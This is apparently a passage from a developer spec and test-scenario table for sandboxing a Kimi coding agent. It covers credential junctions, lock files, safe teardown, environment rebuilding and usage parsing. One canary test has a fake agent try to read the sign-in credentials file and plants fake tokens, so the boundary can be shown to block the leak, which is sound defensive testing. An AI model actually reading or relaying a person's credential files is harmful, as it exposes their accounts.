| S2.36 `TheDisposal_RemovesTheJunctionFirst_VerifiesTheTarget_ThenTheRest` (`KimiHomeTests`) | S2.15's home plus `sessions/x` and `config.toml`; `GitScratch.AfterUnlink` set to a recorder | `KimiHome.Dispose(root)` | `Clean(LinkWasThere: true)`; the root gone; the fake `credentials/` keeps both files (bytes, `ReadOnly`, count 2); the recorder was NEVER invoked — the deleter met no link, so the junction went first | the recorder invoked (the bare deleter unlinks it) / a stub: `Stopped` |
| S2.37 `AVerificationThatFails_StopsTheDisposal_WithTheSentence` | `KimiHome.AfterUnlink` deletes `credentials/kimi-code.json` in the target between the unlink and the second read | `Dispose` | `Stopped` naming `kimi-code.json` and the target; `home/config.toml` and `home/sessions/x` STILL EXIST; the link gone; nothing else deleted | `Clean`, the root gone |
| S2.38 `AHomeWhoseJunctionIsGone_OrWhoseCredentialsIsReal_GoesWhole` (Theory) | the link removed beforehand; `credentials` a real folder holding a read-only copy | `Dispose` | `Clean(LinkWasThere: false)`; the root gone; the fake person's folder untouched | — |
| S2.39 `TheSweepsKimiPath_DisposesJunctionFirst_AndKeepsTheFolderOnALoss` (`ConsultantHomeSweepTests`) | an orphaned `coai-kimi/<id>` past the window whose `home/credentials` is a junction to the test's `persons/`; `GitScratch.AfterUnlink` a recorder; a second arm with `KimiHome.AfterUnlink` deleting a target file | `ConsultantHomeSweep.Sweep` | the folder gone, the recorder never invoked, `persons/` intact; the loss arm: `warn` holds the `Stopped` sentence, the folder KEPT with its lock file, the next beat (seam off) removes it | the recorder invoked; the loss arm: the folder gone |
| S2.40 `DisposeAllUnder_FindsTheFolderItselfAndEveryKhChild` | a folder holding `home/credentials` (a junction), `kh-aaaaaaaaaa/home/credentials` (a junction), `kh-bbbbbbbbbb/` (no link), `vh-cccccccccc/` and `tree/` | `DisposeAllUnder` | answers 3; both junctions gone first (the recorder never invoked), both targets intact; `vh-*` and `tree/` left for the caller's deleter | — |
| S2.41 `TheLockKey_IsTheFoldersIdentity_NotItsSpelling` (`KimiCredentialsLockTests`, Windows; Theory — decision 9) | the test's `persons/credentials`; the rows: upper-cased whole; a trailing `\`; forward slashes; a `..` segment (`persons\x\..\credentials`); `alias\credentials` where `alias` is a junction (`DirectoryLink`) in the test's folder to `persons` (an ANCESTOR link) | `PathFor(row)`, `TreePathFor(row)`; then `TakeAsync(row)` while `TakeAsync(persons\credentials)` is held | every row's path equals the canonical spelling's; the second `TakeAsync` is still waiting after 1.5 s and completes after the first's `Dispose` (S2.27's shape); `Root` is the test's own folder through `RootFor` | *Expected PathFor("…\ALIAS\credentials") to be "…\<key of persons\credentials>.lock" but found "…\<another key>.lock"* — against the REQUIRED first stub (a `KeyFor` that hashes `Junctions`' normalised spelling, brief §9 as first written): only the upper-cased and the alias rows go red under it; the trailing-`\`, `/` and `..` rows are green under `GetFullPath` already and are kept as pins |
| S2.42 `AFolderThatCannotBeNamedByItsHandle_IsRefused_NeverKeyedBySpelling` (Theory — decision 9, review B1) | row 1, SEAM-FREE: a `persons\credentials` that does NOT exist (no handle to name); row 2: the `Final` seam answering empty for an existing folder | `KeyFor`, `PathFor`, `TakeAsync`; `KimiLaunch.TakeAsync` through `FakeKimi` (row 2) | empty, empty, `Unusable` whose cause says "named by its handle"; `Root` (the test's, via `RootFor`) holds NO file afterwards; row 2 also `Refused` with decision 9's sentence and `fake.Started` empty. Row 1 is what proves there is no fallback in production: a key through `CanonicalDirectory` would have been `Real`'s spelling of the missing path | *Expected Hold to be Unusable but found Taken* — and *Expected Root to hold no file but found "<spelling hash>.lock"* |
| S2.43 `TheTreeHold_OutlivesItsOpener_WhileAChildLives` (`KimiCredentialsLockTests`, Windows CI leg — decision 10, review B2 (b)) | **no inheritable handle ever lives in the test host:** the shim is played by a CHILD — `FakeCli.exe tree-hold` (a new verb in `tests_fakecli/Program.cs`; FakeCli references `CoaiMcp.Runners`, `FakeCli.csproj:14`) that calls the PRODUCT's `KimiCredentialsLock.HoldTree(target, root, 1 s)` under `--locks <the test's folder>`, prints `held` on stdout, then starts a sleeping grandchild (`FakeCli.exe` with `FAKECLI_SLEEP_MS=30000` carried on the grandchild's `ProcessRequest.Environment` — NEVER `Environment.SetEnvironmentVariable`) and sleeps itself; the test starts it through `ProcessLauncher` and waits for `held` | the child (the "shim") ended by ITS OWN `Process` handle (`Kill`, never by image name, not the tree) and awaited; `HeldFile.Probe` of both `TreePathFor(target)` and `root/coai-tree.lock`; a SECOND `FakeCli.exe tree-hold` child on the same target (exit 69, stderr `Busy` — a test NEVER calls `HoldTree`, which always opens inheritable; the first draft did, and its "non-inheriting: disposed at once" was false for that window — deviation 33); then the grandchild ended by ITS handle (found by the pid the child printed) and awaited; the probes polled for up to 5 s | both `Held` while the grandchild lives; `Busy`; after the grandchild's end both `Free` within the 5 s poll and re-taken by the test with the NON-inheriting `HeldFile.TakeWithin`/`Take` — never one probe, handle rundown and AV scanners take a moment. **Control arm:** the child takes the GATE instead (`TakeAsync`, non-inheritable), is killed, and `PathFor` probes `Free` while the grandchild still lives — the gate alone would have let a second launch in | *Expected Probe(tree) to be Held because the sleeping grandchild inherited the hold, but found Free* |
| S2.44 `ADisposalUnderALiveTree_IsStopped_AndTheHomeIsKept` (`KimiHomeTests` + an arm in `ConsultantHomeSweepTests` — decision 11, per HOME after review M2) | S2.15's home; its `root/coai-tree.lock` held by the test (a plain, NON-inheritable `HeldFile.Take` — the probe is a sharing check, inheritance is S2.43's); a SECOND finished home `kh-b` on the same sign-in with no hold; the sweep arm: an orphaned `coai-kimi/<id>` past the window holding its own `coai-tree.lock`; `GitScratch.Reading` recording every target the deleter reads | `KimiHome.Dispose(root, warn)`; `Dispose(kh-b)`; `ConsultantHomeSweep.Sweep` | `Stopped` naming "still running", the root and the `coai-tree.lock` path; the junction STILL a link to the target, `config.toml` present, the target's two files intact; `kh-b` is `Clean` and gone (the probe is per home — the other home's tree does not stop it); the recorder saw NO read of the sign-in folder before the `Stopped` (nothing outside coai's tree was opened); the sweep's `warn` holds the sentence and the folder is KEPT; the hold released → the next `Dispose` / `Sweep` is `Clean` / removes it | *Expected Stopped but found Clean(LinkWasThere: true)* — the root gone under the live tree |
| S2.45 `NothingOfTheSignIn_EverAppearsInWhatCoaiWrites` (`KimiCanaryTests`, Windows — decision 12; the `ARowsSystemPromptLeavesNoTraceTests` shape) | TWO canaries: the fake person's `credentials/kimi-code-env-x.json` holds `"refresh_token": "CANARY-REFRESH-7f3a0c keep my sign-in private"`, and their `config.toml`'s `[providers."moonshot-ai"]` row holds `api_key = "CANARY-APIKEY-2b91e4"`; a Theory row with a MALFORMED config (an unterminated string on the `api_key` line, and a `[models."kimi-code/k3"]` block whose `capabilities` line is broken) | the whole story through every ending: `Resolve` → `Made` → `Refusal` → `TakeAsync` (`FakeKimi`, the happy launch and each refusal row of S2.25) → `Dispose`, a `Stopped` disposal (S2.37's seam), a `LinkTargetLostException` (S1.7's seam), a `Busy` gate and an `Unusable` one, `KimiPersonsConfig.Read` and `KimiModelBlocks.For` on the malformed rows; one sweep beat (`ConsultantHomeSweep.Sweep` with a `warn` collector); and one shim turn (`AskAcpMode.RunAsync` with `FakeAcpAgent`, `--locks` the test's folder) whose agent asks `fs/read_text_file` for the credentials file by its real path AND through `<root>/home/credentials/…` and echoes whatever it is given | **collectors, each with its own liveness check** (review M4 — a collector that caught nothing proves nothing): every string any call ANSWERED (liveness: the refusal rows' sentences are present); every exception message (liveness: non-empty, naming the seam's file); the `warn`/`_note` callbacks' lines (liveness: the sweep's loss sentence caught — E4.2's runners classes themselves LOG NOTHING, there is no Serilog under `src_mcp/runners/Vibe`, `Files` or `Acp`; the Serilog surface is the server's and E4.4's, so no sink is claimed here); both lock file names and the per-home file name; the home's `config.toml` bytes (liveness: the slot's `key` name is in them); the report JSON (liveness: `reads` has the two refused entries) and the shim's `note` stderr (liveness: the exit sentence caught): NONE contains either canary; the report's two `reads` are `served: false` with a type-named reason; the malformed rows refuse naming the KEY and the cure, never the line. **The bound, pinned as text:** the agent's stderr and its own error text in `reason` are vendor text relayed by coai (decision 12) — the test's fake agent writes neither canary, so they are collected too, but a real vendor's would be outside the pin. **Control arm:** the same agent asking for `notes.md` INSIDE the snapshot root, written with the first canary → `served: true` and the canary in `answer` — the detector sees a served canary | a pin: green from the first run is the expected outcome; its red, if ever, reads *Expected <collector> not to contain "CANARY-REFRESH-7f3a0c" but found it in <where>* (or the api-key canary's twin); a collector's liveness red (*Expected the warn collector to contain the loss sentence but it was empty*) or the control arm's red (*Expected answer to contain the canary*) means the detector is blind and the pin is void |
| S2.46 `AnAncestorLink_IsAdmitted_AndOneThatLeavesTheLocalDrives_IsRefused` (`JunctionsTests`, Windows; Theory — decision 13) | `alias` a junction in the test's folder to `persons`; target `alias\credentials` (the ancestor is the link; the target is a real folder); a second row through the `final` seam answering `\\server\share\x\credentials`; a third answering empty (seam-only by necessity — `Missing` refuses an absent folder before `Resolved` is asked, brief §17; the seam-free no-key proof is S2.42 row 1) | `Junctions.Refusal`, `Make`, `Target(link)` | row 1: empty, made, `Target` IS the `alias` spelling (one level — never resolved into the junction's own target), `File.ReadAllBytes(link\kimi-code.json)` the bytes, the person's folder whole after `DirectoryLink.Remove`; row 2: the "resolves to \\server\share…" sentence, nothing at `link`; row 3: the "cannot be named by its handle" sentence, nothing at `link`. S1.3's chained row (the TARGET a junction) still refused | rows 2 and 3: *Expected refusal to contain "resolves to" but found ""* — admitted today; row 1 green today (pins the admission) |

**Review focus (Opus).** (1) Nothing in `KimiLaunch`, `KimiHome`, `KimiPlaces.ForShim` reads `SpecialFolder.UserProfile`,
`Environment.GetEnvironmentVariable` or `KimiAcpProfile.InstalledExecutable` — grep the diff; the only environment read
is `KimiPlaces.Resolve`'s injected `env`. (2) The render: byte-for-byte the probe's, no escaping invented, the person's
values pass through unchanged or refuse. (3) The validation is an ALLOWLIST (S2.17's `notes.txt` row is the proof),
`credentials` is never descended, `config.toml` is compared as bytes, `os/` must be empty. (4) The lock: released on
EVERY way out of `TakeAsync` after it was taken (a refusal, a throw, a cancellation while the version runs); never under
`coai-kimi/`; the wait honours `ct`. (5) `BuiltPath` idempotent and the first entry; `EnvironmentRefusal` compares names
with `ProcessEnvironment.NameComparer`. (6) The tools rule: both names; the sentence's two cures; no download path
admitted. (7) Vibe's warning byte-identical — the existing test untouched and green. (8) CC ≤ 4 everywhere; `Refusal`'s
walk will want to grow — keep it in `Judge`-sized methods. (9) No test touches `~/.kimi-code`; every junction target is
inside the test's `testsToDelete-` folder. (10) `KimiHome.Dispose`'s order is the code's order — the unlink before any
read of the tree, the verification before `GitScratch`, a `Stopped` that leaves `config.toml` in place; the sweep's
`Removed` returns false on a `Stopped` while its lock file is still held. (11) The lock key is NEVER the spelling: an
empty canonical path ends in `Unusable` and a refusal, not in a hash of `GetFullPath` (grep `PathFor` for a fallback).
(12) `FileShare.Inheritable` appears in exactly one method, `HoldTree`, and the gate's `TakeAsync` never passes it; the
shim takes the tree hold in `AskAcpMode.TurnAsync` IMMEDIATELY before `AcpClient.AskAsync` with no `await` between,
only when `--locks` is given, and disposes it after `AskAsync` returns; no TEST holds an inheritable handle in the
test host (grep the tests for `inheritable: true` — S2.43's child is the only taker). (13) `Dispose`'s probe is the
per-HOME file, asked before the unlink and before any read outside coai's tree; `Held` and `Unknown` stop with nothing
unlinked, `Free` proceeds. (14) S2.45 has its control arm and a liveness check per collector; `KeyFor` has no path
through `CanonicalDirectory` (B1) — `FinalDirectory` only, and `CanonicalDirectory` is still private. (15) Tests
override the lock root through `RootFor`, never by assigning the static; `FAKECLI_*` travel on
`ProcessRequest.Environment`, never on the process.

**Consultation 7de9430b — what was taken and what was not** (Fable, 2026-10-15; each hypothesis verified against
`Junctions.cs`, `GitScratch.cs`, `HandleRead.cs`, `HeldFile.cs`, `ProcessLauncher.cs` before adopting):
- *(a) case-fold and normalise the lock path; alias through an ancestor link only by handle identity* — **taken,
  amended**: the key is the handle's final path (`HandleRead.CanonicalDirectory`, upper-cased, hashed), which IS the
  handle identity spelled as a path; volume serial + file index was rejected (a second import for the same identity,
  128-bit ids on ReFS); fail closed when the handle cannot be named (decision 9, S2.41–S2.42).
- *(b) a killed lock owner leaves a refreshing orphan; the lock must survive the owner* — **taken**: a second,
  inheritable tree hold taken by the shim and inherited by `kimi`, kernel-released when the last of them dies; the
  gate stays the server's and non-inheritable; a job object rejected (kills mid-refresh, three imports, the epic's
  out-of-scope teardown twin); the kill-mid-refresh window stated as the residual (decision 10, S2.43).
- *(c) the deleter's TOCTOU — does the Kimi teardown need more* — **limit confirmed** with its reasoning (same-user
  swapper, no privilege boundary, Kimi makes no links); but the confirmation found a real gap beside it — a teardown
  under a LIVE orphan `kimi` turns its next refresh into a sign-out — closed by the tree probe before the unlink
  (decision 11, S2.44).
- *(d) a credential leaking through the shim's report* — **taken as a pin** with an honest bound: the report carries
  paths and type-named reasons, never bytes; a canary in the sign-in never appears in anything coai writes; the agent's
  own text is the vendor's, so the control arm proves the detector rather than the vendor (decision 12, S2.45).
- *(e) the target's ancestors must be link-free* — **rejected as a refusal, taken as a resolution**: a relocated profile
  is an ancestor junction on an ordinary machine; the ancestors are admitted, the final path is resolved at launch,
  and only a resolution off the local drives (a symlink to UNC under `C:\`) is refused (decision 13, S2.46).

**Opus review of f1983923 (REVISE, 2026-10-15) — what was taken and what was not**, each verified against the code:
- *B1 `CanonicalDirectory` falls back to the spelling* — **taken** (`HandleRead.cs:223` → `WorktreePaths.Real`): a new
  internal `FinalDirectory` (empty when unnamed), `CanonicalDirectory` private and unchanged for `Trust`; a seam-free
  missing-folder row (decision 9, brief §16, S2.42 row 1).
- *B2 the parallel suite* — **taken** all three: `RootFor` as an `AsyncLocal` override (brief §9); S2.43's shim played
  by a FakeCli child with the hold, so the test host never holds an inheritable handle; the hold only under `--locks`
  (decision 10); `FAKECLI_*` on the request's environment.
- *B3 "kimi's children hold it only while they run" is unmeasured* — **taken**: said as unmeasured in decision 10, and
  E4.3's probe measures the cell (S3.14, S3.17) before the hold ships as a gate; RESULTS §25 names it until then.
- *M1 every answered turn ends with a tree kill* — **taken**, verified (`AcpClient.cs:106-111`, `AcpTransport.cs:217-224`);
  the window is stated as every turn's; a Kimi-only stdin-EOF grace weighed and not taken (finding G's order), M-K14
  decides (decision 10).
- *M2 the probe is per sign-in, not per home* — **taken**: a second inheritable per-home file `<root>/coai-tree.lock`
  taken with the first; `Dispose` probes that and never re-keys or opens the sign-in folder (decision 11, brief §9/§14,
  S2.44's second home and `Reading` recorder). The alternative — writing the key into the home — rejected: a key written
  at make time is the spelling-era value of a folder that may since have been retargeted, and a file in the home that
  names the sign-in's hash is one more thing the inventory has to admit.
- *M3 "connects out once" is false* — **taken**: the touches named honestly (`Missing`, `Chained`, two `KeyFor`
  opens, the deleter's listings), the refusal's worth restated, the top-down walk weighed and not taken (decision 13).
- *M4 the canary's collectors* — **taken**: a liveness check per collector, the second canary in `api_key` with the
  malformed-TOML rows, which classes log (none in E4.2's runners), kimi's stderr named as vendor text outside the pin
  (decision 12, S2.45).
- *Minor* — all taken: `HeldFile.cs:45`/`:48`; the inheritance reason (`bInheritHandles = TRUE` regardless of
  redirection, no handle list); S2.41's red named against the required spelling stub; `ToUpperInvariant` on a
  case-sensitive folder merges keys in the safe direction (decision 9); S2.43 polls after the kill; the hold is taken in
  `AskAcpMode`, not around `AcpTransport.Start`.
- *The two open points* — E4.3's table gets S3.14–S3.17 (its rows are mine to add for these); the letterless volume is
  a fail-closed refusal only after B1, recorded as unmeasured in RESULTS §25.

**Docs.** As brief §13.

## E4.3 — The shim: `--home`, the agent's environment rebuilt, the model checked in the session, `/usage` parsed

`model: opus` spec (this document) · Sonnet codes · Opus reviews.

**Carried from E4.2's review (2026-10-15) — notes, nothing more.** (a) Re-run S2.45's shim arm (`KimiCanaryTests`) with the tree hold ACTUALLY taken: E4.2's arm passes `--locks` and `--home` flags the shim does not read yet, so it takes no hold. (b) Prove deviation 32 — that the shim reads no environment — in a CHILD process started with a redirected `USERPROFILE`; no test in the host may redirect its own. (c) Record the M-K15 measurement (S3.17: after a normal `EndAsync` the `.tree.lock` is `Free` within ~2 s; with the shim killed mid-turn it stays `Held` until `kimi` exits) in `research/RESULTS_kimi_confinement.md` BEFORE E4.3's code round. The owner's ruling stands: the tree hold GATES as specified, and there is no warning-only fallback. (d) The environment builder is now `KimiEnvironment` (`Built`, `BuiltPath`, `Refusal`, `FlagOf`, `PathOf`), not `KimiLaunch` — read every `KimiLaunch.Built` / `KimiLaunch.EnvironmentRefusal` below and in E4.4 as that.

**Goal.** `coai-mcp --ask-acp --profile kimi` starts `kimi acp` only in the environment `KimiLaunch` builds from
`--home` (never by inheritance, D19), refuses an asked model the session does not announce (exit 65 with the list,
D10), and after an answered turn asks `/usage` and reports `tokensIn`/`tokensOut` (D15, M-K2). The two names M-K9 (e)
added join both exclusion lists.

**Files and anchors (verified).**
- `src_mcp/src/Acp/AskAcpMode.cs` — exit codes `:37-43`; `RunAsync` `:58-77`; `TurnAsync` `:80-106` (builds
  `AcpAsk` at `:100`, the boundary at `:101`); `Refusal` `:109-110`; `Report` `:184-208`; `UsageObject` `:211-221`
  (always `tokensIn: 0, notCaptured: true`).
- `src_mcp/runners/Acp/AcpOutcome.cs:9` (`AcpAsk`), `:35-38` (`AcpUsage`), `:66-79` (`AcpOutcome`).
- `src_mcp/runners/Acp/AcpClient.cs:36-57` (`AskAsync` → `AcpTransport.Start(ask.Executable, profile.Arguments,
  ask.Cwd)`), `:63-99` (`TurnAsync`: `initialize` → `session/new` `:74` → `set_config_option` `:82` → `session/prompt`
  `:83` → `Stopped`), `:148-158` (`Stopped`).
- `src_mcp/runners/Acp/AcpTransport.cs:87-88` — `Start` builds `new ProcessRequest(executable, arguments, cwd)`, which
  INHERITS (`ProcessRequest.InheritsEnvironment` defaults to `true`, `ProcessLauncher.cs:100`).
- `src_mcp/runners/Acp/AcpSession.cs:80` (`Answer` — every `agent_message_chunk` of the session, concatenated),
  `:452-466` (`Update`, `usage_update`).
- `src_mcp/runners/Acp/AcpMessages.cs:62` (`NewSession`), `:64` (`SetConfigOption`); `session/new`'s result carries
  `configOptions: [{ id, options: [{ value, name }] }]` (the shape the probe read, `scripts/probe-kimi-confinement.mjs:527-528`).
- `src_mcp/runners/Acp/IAcpProfile.cs:13-34`; `src_mcp/runners/Acp/KimiAcpProfile.cs:34` (`Exclusions`).
- `src_mcp/runners/Snapshots/SnapshotOptions.cs:59` (`SnapshotExclusions.Default`) and its remarks `:45-55` (an entry
  with a separator is a PATH suffix, one without is a NAME at any depth).
- `src_mcp/src/Program.cs:336` (the mode), `:430` (the call), `:2441-2442` (the help text); `.agents/PROJECT.md:51-68`
  (the one-shot modes list, and "never exits 64").
- Test harness: `src_mcp/tests/FakeAcpAgent.cs:147-162` (`FakeAcpProfile`), `src_mcp/tests_fakecli/AcpAgent.cs:90-94`
  (`session/new` answers `configOptions: []`), `:96-97` / `:113-124` (`set_config_option`), `:99-100` / `:127-152`
  (`session/prompt` runs the script's steps ONCE, whatever the prompt text); existing classes `AskAcpModeTests`,
  `AskAcpShimScenarioTests`, `AcpClientTests`, `AcpReadBoundaryTests`, `KimiAcpProfileTests`.

**BRIEF.**
1. **The fake agent learns three things** (`tests_fakecli/AcpAgent.cs`), each from a script field so existing scripts
   keep their behaviour: `models` — the `model` option's values announced by `session/new` (absent → announce `["m-1"]`,
   the default `FakeAcpAgent.Ask` already sends, so no existing test changes); `usageReply` — the text of the chunk the
   agent answers a `session/prompt` whose text is exactly `/usage` with (absent → that prompt runs the normal script,
   as today); `envFile` — on start, the agent writes its whole environment (`NAME=value` lines, sorted) to that path.
   `FakeAcpAgent` gets the matching helpers and a `Profile(…, environment: …)` overload (next step).
2. **The agent's request comes from the profile.** `AcpTransport.Start` takes a `ProcessRequest` (not exe/args/cwd);
   `IAcpProfile` gains `ProcessRequest AgentRequest(string executable, string cwd, string home)` with a DEFAULT body
   returning today's inherited request (so `FakeAcpProfile` and any test profile keep working) and `bool NeedsAHome =>
   false`. `KimiAcpProfile` overrides both: `NeedsAHome => true`, and `AgentRequest` = `KimiLaunch.Built(new
   ProcessRequest(executable, Arguments, cwd), …)` — the E4.2 seam, exactly as E4.2's brief pins it (the person's paths
   NOT re-derived inside this process — see E4.2's boundary). *[E4.2 pinned it, 2026-10-14: `KimiLaunch.Built(request,
   KimiPlaces.ForShim(flags["--home"], flags["--persons-bin"]))` and `KimiLaunch.EnvironmentRefusal(request, places)`;
   `--home` is the owned ROOT holding `home/` and `os/` (`KIMI_CODE_HOME` = `<root>/home`), and `--persons-bin` is the
   second flag the shim needs — so `AgentRequest(executable, cwd, home)` gains `personsBin`.]* `AcpAsk` gains `Home`. `AcpClient.AskAsync` builds the
   request through the profile, then asks `KimiLaunch.EnvironmentRefusal` through a profile member (`string
   AgentRefusal(ProcessRequest request) => string.Empty` by default; Kimi's calls `KimiLaunch.EnvironmentRefusal`) and
   returns `NotStarted` with that sentence when it is not empty — the agent never starts.
3. **`--home`.** `AskAcpMode.Refusal` gains `HomeRefusal(profile, home)`: a profile that `NeedsAHome` without
   `--home`, or with a folder that does not exist → 65 with `--ask-acp needs --home <the coai-owned KIMI_CODE_HOME>`
   *[E4.2: the owned ROOT, whose `home/` is `KIMI_CODE_HOME`; `--persons-bin` is refused the same way when absent]*.
   An agent-environment refusal from step 2 is ALSO 65 (a request this shim will not make), and the report is printed
   (`end: not_started`). Update the 65 line of the type's remarks and `Program.cs:2441` with `--home <folder>`.
4. **The model, checked in the session** (D10 (2)). In `AcpClient.TurnAsync`, after `session/new`, read the announced
   `model` option values (a pure `AcpMessages.AnnouncedValues(JsonElement sessionResult, string optionId)` →
   `IReadOnlyList<string>`). If the profile's `ModelOptionId` is not announced at all, or the asked model is not among its
   values, end WITHOUT sending `set_config_option`: a new `AcpEnd.ModelNotOffered` (word `model_not_offered`), reason
   `the agent's session offers <a, b, c> for 'model'; '<asked>' is not one of them`, exit **65** (the request named a
   value the agent will not take — 65 is "a request this shim will not make", never 64, never 70). Keep `TurnAsync` at
   CC ≤ 4: extract `ConfigureAsync(session, sessionId, sessionResult, ask)`.
5. **`/usage` after `end_turn`** (D15, M-K2: answered by Kimi in ~2 s, no model call). Only when `stop == end_turn`:
   record the answer's length (`session.Answer.Length`), send `session/prompt` with the text `/usage` on the SAME
   session, bounded by its own short deadline (a constant, 15 s, linked to the turn's token — never longer than what is
   left of the turn), then split: the answer is `Answer[..mark]`, the `/usage` reply is `Answer[mark..]`. Parse the
   reply with a pure `AcpUsageLine.Parse(string text) → (long In, long Out, bool Captured)`: the regex
   `Session total:\s*([\d,]+)\s+input,\s*([\d,]+)\s+output` (digits with optional thousands commas, culture-invariant);
   anything else (`Session total: no LLM calls yet`, no line, a timeout, an agent error on the second prompt) →
   `Captured = false`. The second prompt can NEVER change the turn's end, answer or exit: any exception from it is caught
   and leaves usage not captured. `AcpOutcome` gains `TokensIn`, `TokensOut`, `TokensCaptured`; `UsageObject` writes them
   (`notCaptured` = `!TokensCaptured`, tokens 0 when not captured — never a guessed number); `contextUsed`/`contextSize`
   stay as today. A turn that did not end `end_turn` sends nothing more (the agent's log shows ONE `session/prompt`).
6. **Exclusions** (M-K9 (e), §21). `KimiAcpProfile.Exclusions` (`:34`) and `SnapshotExclusions.Default`
   (`SnapshotOptions.cs:59`) both gain `".agents/agents"` (a PATH suffix, like `.agents/skills`) and `".mcp.json"` (a
   NAME — the parent says "project-root `.mcp.json`"; matching it at every depth is the stricter reading and what a name
   entry does; keep it, and say so in the remarks). Update both remarks to cite §21.
7. **Docs**: `research/module_runners.md` (the shim: `--home`, the rebuilt environment, the in-session model check, the
   `/usage` usage), `.agents/PROJECT.md` (the `--ask-acp` line: `--home`; 65 now also covers a model the session does not
   offer and an agent environment that is not coai's), CHANGELOG.

**SCENARIOS** (each one a test; red first — the expected red is what today's code does).

| # | Given | When | Then | Expected red today |
|---|---|---|---|---|
| S3.1 `ATurnWithoutAHome_IsRefused65` (`AskAcpModeTests`) | the `kimi` profile, `--cwd` an existing folder, a model, no `--home` | `AskAcpMode.RunAsync` | exit 65; the note names `--home`; no process started | exit 69 (`not_started`: `kimi` not found) or 0 — the flag is unknown, nothing checks it |
| S3.2 `TheAgentGetsTheBuiltEnvironment_NotTheParents` (`AskAcpShimScenarioTests`) | a fake agent with `envFile`; a profile whose `AgentRequest` is `KimiLaunch.Built` on a fake person's home in the test's own folder; the PARENT environment carries `KIMI_CODE_HOME=<elsewhere>`, `USERPROFILE=<real>` and `VIBE_MCP_SERVERS=x` | the shim runs one turn with `--home <owned>/home` | the agent's environment holds only `Minimal`'s names plus `KIMI_CODE_HOME` (= the owned home) and `KIMI_CODE_NO_AUTO_UPDATE=1`; `USERPROFILE`, `HOME`, `HOMEDRIVE`+`HOMEPATH` point into the owned `os/`; `PATH`'s first entry is the fake person's `bin`; neither `VIBE_MCP_SERVERS` nor the parent's `KIMI_CODE_HOME` is there | the agent's file shows the parent's `KIMI_CODE_HOME` and `VIBE_MCP_SERVERS` (inherited, `AcpTransport.cs:87-88`) |
| S3.3 `AnAgentEnvironmentThatIsNotCoais_IsRefusedBeforeStart` | a profile whose `AgentRefusal` answers a sentence (e.g. `--home` whose `os/` is missing, per E4.2's refusal) | one turn | exit 65, `end: not_started`, the sentence on stderr; the fake agent's log file does not exist | the agent starts |
| S3.4 `AModelTheSessionDoesNotOffer_Exits65WithTheList` | a fake agent announcing `models: ["kimi-code/k3-256k","kimi-code/k3"]` | `--model kimi-code/kimi-for-coding` | exit 65; stderr names both announced values and the asked one; the agent's log has NO `session/set_config_option` and NO `session/prompt`; report `end: model_not_offered` | exit 0 — `set_config_option` sent, the fake replies `{}`, the prompt answered |
| S3.5 `AnOfferedModel_IsSetAndAsked` | the same agent | `--model kimi-code/k3` | `set_config_option` sent with `kimi-code/k3` before the prompt; exit 0 | (green today for the order; keeps the happy path pinned) |
| S3.6 `ASessionThatOffersNoModelOption_Exits65` | a fake agent announcing `configOptions: []` explicitly (`models: []`) | any model | exit 65, "offers no 'model' option" | exit 0 |
| S3.7 `AfterAnAnswer_UsageIsTheSessionTotal` | a fake agent: chunk `OK`, `end_turn`; `usageReply`: `Context: 20004 / 262144 tokens (8%) Session total: 19973 input, 31 output` | one turn | report `usage.tokensIn = 19973`, `tokensOut = 31`, `notCaptured = false`; `answer` is exactly `OK` (no `Session total` in it); the agent's log shows two `session/prompt`, the second's text `/usage` | `tokensIn 0`, `notCaptured true` |
| S3.8 `AnUnparseableUsageReply_IsNotCaptured_NeverZeroAsANumber` | `usageReply`: `Context: 0 / 262144 tokens (0%) Session total: no LLM calls yet` | one turn | `notCaptured = true`, `tokensIn = 0`, `tokensOut = 0`, exit 0, answer intact | (green for tokens today — pins that a parse failure stays unknown once S3.7 is in) |
| S3.9 `AUsagePromptThatFails_LeavesTheAnswerAlone` | an agent that answers the `/usage` prompt with a JSON-RPC error (a `promptErrorOnUsage` field) — and a second case where it hangs past the 15 s bound | one turn | exit 0, `end: answered`, the answer kept, `notCaptured = true`; the hang case returns within the bound plus the teardown grace | the error turns the answered turn into `agent_failed`, exit 70 (once S3.7's call exists without its guard) |
| S3.10 `NoUsageIsAskedAfterANonAnswer` | an agent ending `stopReason: max_tokens` | one turn | exactly ONE `session/prompt` in the log; `notCaptured = true`; exit 70 | two prompts (once S3.7 exists without its guard) |
| S3.11 `TheBoundaryRefusesTheTwoNewNames` (`AcpReadBoundaryTests`) | a snapshot root holding `.agents/agents/x.md`, `sub/.agents/agents/y.md` and `.mcp.json` | `fs/read_text_file` for each | each refused as an excluded name, not quoted | served |
| S3.12 `TheSnapshotLeavesOutTheTwoNewNames` (`ReviewSnapshotTests`) | a tree with `.agents/agents/x.md`, `.agents/PROJECT.md`, `.mcp.json`, `sub/.mcp.json` | a snapshot is made | the first, third and fourth absent and listed as excluded in the manifest; `.agents/PROJECT.md` present | all present |
| S3.13 `AcpUsageLineTests` (pure) | `19,973 input, 31 output`; `Session total: 7 input, 0 output`; a line with only `input`; empty | `Parse` | (19973, 31, true); (7, 0, true); not captured; not captured | (class does not exist) |
| S3.14 `TheTreeHold_IsTakenBeforeTheStart_AndFreeAfterANormalTurn` (`AskAcpShimScenarioTests`; E4.2 decision 10 — rows S3.14–S3.17 added by Fable 2026-10-15 with the E4.2 owner's leave) | a fake agent with `envFile`; a Kimi-shaped profile on an owned home in the test's folder whose `home/credentials` is a junction to the test's `persons/credentials`; `--locks <the test's folder>` | one turn | the agent's `envFile` was written while BOTH `KimiCredentialsLock.TreePathFor(target)` and `<root>/coai-tree.lock` probed `Held` (the fake agent probes them itself at start and writes the two words into `envFile`); after the shim exits both probe `Free` within a 5 s poll; `end: answered` | the words are `Free`/absent — no hold is taken |
| S3.15 `ATreeHoldThatIsBusyPastTheDeadline_Exits69WithTheSentence` | the same, with `TreePathFor(target)` held by a FakeCli child (S2.43's `tree-hold` verb) for the test's duration; `--deadline-seconds 3` | one turn | exit 69, `end: not_started`, stderr holds "another Kimi started on this sign-in is still running" and the path; the fake agent's log file does not exist (never started); returns within the deadline plus grace | exit 0 — the agent starts beside the holder |
| S3.16 `AKimiProfileWithoutLocks_IsRefused65_AndAFakeProfileTakesNoHold` (Theory) | the `kimi` profile without `--locks`; `FakeAcpProfile` without `--locks` | `AskAcpMode.RunAsync` | 65 with `--ask-acp needs --locks <the lock folder>` for Kimi; the fake turn runs and `Root` (the test's) holds no `.tree.lock` afterwards | exit 69 (`kimi` not found) / a hold taken under the product's default `Root` |
